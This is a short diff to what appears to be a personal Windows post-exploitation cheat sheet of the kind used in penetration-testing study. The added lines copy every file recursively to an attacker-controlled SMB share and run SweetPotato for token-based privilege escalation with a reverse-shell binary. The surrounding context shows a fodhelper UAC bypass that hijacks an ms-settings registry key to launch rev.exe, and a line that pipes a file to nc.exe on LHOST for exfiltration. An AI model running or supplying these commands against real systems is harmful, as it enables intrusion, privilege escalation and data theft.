@@ -45,6 +45,7 @@ dir *StickyNotes* /S /B
 net use u: \\<lhost>\kali /user:username password
 net use u: /d # unmount
 copy \\<lhost>\kali\<some-file> C:\Windows\tasks\<some-file>
+xcopy *.* \\<lhost>\kali /S /E
 
 # autostart writeable
 C:\Windows\tasks\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
@@ -98,6 +99,9 @@ New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c C:\windows\tasks\rev.exe" -Force
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+# tokens
+.\SweetPotato.exe -p rev.exe
 
 # other
 type important_file.txt | nc.exe LHOST LPORT
